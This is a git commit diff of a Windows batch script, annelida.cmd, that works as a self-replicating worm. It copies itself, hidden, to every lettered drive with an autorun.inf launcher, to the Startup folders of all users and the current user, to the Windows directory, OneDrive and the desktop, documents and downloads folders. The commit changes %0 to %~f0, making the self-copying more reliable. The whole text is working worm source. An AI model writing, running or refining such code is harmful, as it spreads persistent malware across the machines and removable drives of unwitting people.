4be07c6212845eb98638a6ccac92d598ba2f22b9
Maxwell Fisher <54481244+Maxwell-Fisher@users.noreply.github.com>
2022-05-02 09:15:46 -0600

    Add files via upload

--- annelida.cmd
+++ annelida.cmd
@@ -56,11 +56,11 @@ cls
 setLocal enableDelayedExpansion
 
 :: This stops the script from running and deletes it during any year other than what is allowed
-echo %date% | find "%allowedYear%" > nul || del %0
+echo %date% | find "%allowedYear%" > nul || del %~f0
 
 set /a currentIteration=currentIteration+1
 
-if not exist "%annelida.cmd%" move "%0" annelida.cmd
+if not exist "%annelida.cmd%" move "%~f0" annelida.cmd
 
 
 %= Copies to the root directory of all drives which have assigned letters =%
@@ -69,9 +69,9 @@ set alphabetIndex=0
 :driveCopyLoop
 	if exist "!alphabet:~%alphabetIndex%,1!:" (
 		if not exist "!alphabet:~%alphabetIndex%,1!:\annelida.cmd" (
-			echo set currentIteration=%currentIteration% %%= %date% =%%>"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& type "%0">>"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& attrib +h "!alphabet:~%alphabetIndex%,1!:\annelida.cmd"
+			echo set currentIteration=%currentIteration% %%= %date% =%%>"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& type "%~f0">>"!alphabet:~%alphabetIndex%,1!:\annelida.cmd"& attrib +h "!alphabet:~%alphabetIndex%,1!:\annelida.cmd"
 			if not exist "!alphabet:~%alphabetIndex%,1!:\autorun.inf" (
-				echo [autorun]>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"& echo label=annelida>>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"& echo open=annelida.cmd>>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"
+				echo [autorun]>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"& echo open=annelida.cmd>>"!alphabet:~%alphabetIndex%,1!:\autorun.inf"
 			)
 		)
 	)
@@ -82,61 +82,61 @@ if not "%alphabetIndex%" == "25" goto driveCopyLoop
 
 if exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of all users =%
 	if not exist "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%0" >> "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
 	)
 )
 
 if exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" ( %= Copies to the startup folder of the current user =%
 	if not exist "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%0" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"& type "%~f0" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\annelida.cmd"
 	)
 )
 
 if exist "%windir%" ( %= Copies to the root Windows directory of the current computer =%
 	if not exist "%windir%\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%windir%\annelida.cmd"& type "%0" >> "%windir%\annelida.cmd"& attrib +h "%windir%\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%windir%\annelida.cmd"& type "%~f0" >> "%windir%\annelida.cmd"& attrib +h "%windir%\annelida.cmd"
 	)
 )
 
 if exist "%onedrive%" ( %= Copies to the OneDrive of the current user =%
 	if not exist "%onedrive%\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%onedrive%\annelida.cmd"& type "%0" >> "%onedrive%\annelida.cmd"& attrib +h "%onedrive%\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%onedrive%\annelida.cmd"& type "%~f0" >> "%onedrive%\annelida.cmd"& attrib +h "%onedrive%\annelida.cmd"
 	)
 )
 
 if exist "%userprofile%\Desktop" ( %= Copies to the desktop of the current user =%
 	if not exist "%userprofile%\Desktop\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%userprofile%\Desktop\annelida.cmd"& type "%0" >> "%userprofile%\Desktop\annelida.cmd"& attrib +h "%userprofile%\Desktop\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%userprofile%\Desktop\annelida.cmd"& type "%~f0" >> "%userprofile%\Desktop\annelida.cmd"& attrib +h "%userprofile%\Desktop\annelida.cmd"
 	)
 )
 
 if exist "%userprofile%\Documents" ( %= Copies to the documents of the current user =%
 	if not exist "%userprofile%\Documents\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%userprofile%\Documents\annelida.cmd"& type "%0" >> "%userprofile%\Documents\annelida.cmd"& attrib +h "%userprofile%\Documents\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%userprofile%\Documents\annelida.cmd"& type "%~f0" >> "%userprofile%\Documents\annelida.cmd"& attrib +h "%userprofile%\Documents\annelida.cmd"
 	)
 )
 
 if exist "%userprofile%\Downloads" ( %= Copies to the downloads of the current user =%
 	if not exist "%userprofile%\Downloads\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%userprofile%\Downloads\annelida.cmd"& type "%0" >> "%userprofile%\Downloads\annelida.cmd"& attrib +h "%userprofile%\Downloads\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%userprofile%\Downloads\annelida.cmd"& type "%~f0" >> "%userprofile%\Downloads\annelida.cmd"& attrib +h "%userprofile%\Downloads\annelida.cmd"
 	)
 )
 
 if exist "%public%\Desktop" ( %= Copies to the desktop of all users =%
 	if not exist "%public%\Desktop\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%public%\Desktop\annelida.cmd"& type "%0" >> "%public%\Desktop\annelida.cmd"& attrib +h "%public%\Desktop\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%public%\Desktop\annelida.cmd"& type "%~f0" >> "%public%\Desktop\annelida.cmd"& attrib +h "%public%\Desktop\annelida.cmd"
 	)
 )
 
 if exist "%public%\Documents" ( %= Copies to the documents of all users =%
 	if not exist "%public%\Documents\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%public%\Documents\annelida.cmd"& type "%0" >> "%public%\Documents\annelida.cmd"& attrib +h "%public%\Documents\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%public%\Documents\annelida.cmd"& type "%~f0" >> "%public%\Documents\annelida.cmd"& attrib +h "%public%\Documents\annelida.cmd"
 	)
 )
 
 if exist "%public%\Downloads" ( %= Copies to the downloads of all users =%
 	if not exist "%public%\Downloads\annelida.cmd" (
-		echo set currentIteration=%currentIteration% %%= %date% =%% > "%public%\Downloads\annelida.cmd"& type "%0" >> "%public%\Downloads\annelida.cmd"& attrib +h "%public%\Downloads\annelida.cmd"
+		echo set currentIteration=%currentIteration% %%= %date% =%% > "%public%\Downloads\annelida.cmd"& type "%~f0" >> "%public%\Downloads\annelida.cmd"& attrib +h "%public%\Downloads\annelida.cmd"
 	)
 )
 
